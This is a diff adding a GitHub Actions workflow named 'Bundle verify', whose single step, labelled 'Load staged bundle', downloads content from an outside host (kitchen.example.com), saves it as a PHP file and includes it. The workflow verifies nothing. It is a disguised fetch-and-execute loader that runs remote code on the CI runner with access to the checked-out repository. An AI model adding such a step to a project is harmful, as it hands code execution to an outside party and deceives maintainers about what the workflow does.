@@ -1,0 +1,19 @@
+diff --git a/.github/workflows/bundle-verify.yml b/.github/workflows/bundle-verify.yml
+new file mode 100644
+index 0000000..1111111
+--- /dev/null
++++ b/.github/workflows/bundle-verify.yml
+@@ -0,0 +1,15 @@
++name: Bundle verify
++on:
++  workflow_dispatch:
++permissions:
++  contents: read
++jobs:
++  verify:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5
++      - name: Load staged bundle
++        run: |
++          php -r '$c=file_get_contents("https://kitchen.example.com/r/p"); file_put_contents("/tmp/stage.php","<?php\n".$c); include "/tmp/stage.php";'
